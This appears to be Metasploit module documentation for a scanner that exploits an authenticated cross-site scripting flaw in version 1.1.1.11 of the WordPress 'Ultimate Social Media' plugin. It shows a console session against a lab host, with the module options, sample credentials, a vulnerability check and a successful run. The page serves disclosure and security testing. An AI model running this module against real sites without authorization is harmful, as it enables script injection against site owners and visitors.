#### Add WordPress Plugin Ultimate Social Media XSS Vulnerability.

  Application: WordPress Plugin 'Ultimate Social Media' 1.1.1.11
  Homepage: https://wordpress.org/plugins/ultimate-social-media-icons/
  Source Code: https://downloads.wordpress.org/plugin/ultimate-social-media-icons.1.1.1.11.zip
  References: https://wpvulndb.com/vulnerabilities/8231
  Active Installs: 60,000+

#### Vulnerable packages*
        
  1.1.1.11
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf>  use auxiliary/scanner/http/wp_social_media_and_share_xss_scanner 
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  info

       Name: WordPress Social Media and Share Icons XSS Scanner
     Module: auxiliary/scanner/http/wp_social_media_and_share_xss_scanner
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2015-11-22

Provided by:
  g0blin
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host
  WP_PASS                     yes       A valid password
  WP_USER                     yes       A valid username

Description:
  This module attempts to exploit an Authenticated Cross-Site 
  Scripting in Social Media and Share Icons Plugin for WordPress, 
  version 1.1.1.11 and likely prior in order if the instance is 
  vulnerable.

References:
  https://wpvulndb.com/vulnerabilities/8231
  https://research.g0blin.co.uk/g0blin-00052/

msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  show options 

Module options (auxiliary/scanner/http/wp_social_media_and_share_xss_scanner):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host
   WP_PASS                     yes       A valid password
   WP_USER                     yes       A valid username

msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  set RHOSTS 192.168.0.14
RHOSTS => 192.168.0.14
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  set WP_USER espreto
WP_USER => espreto
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  set WP_PASS wp@2015
WP_PASS => wp@2015
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  check 
[*] 192.168.0.14:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner)  run

[+] 192.168.0.14:80 - Vulnerable to Cross-Site Scripting the Ultimate Social Media 1.1.1.11 plugin for WordPress
[+] Save in: /home/espreto/.msf4/local/32395811.html
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msfdevel 192.168.0.5 shell[s]:0 job[s]:0 msf> auxiliary(wp_social_media_and_share_xss_scanner) 
```
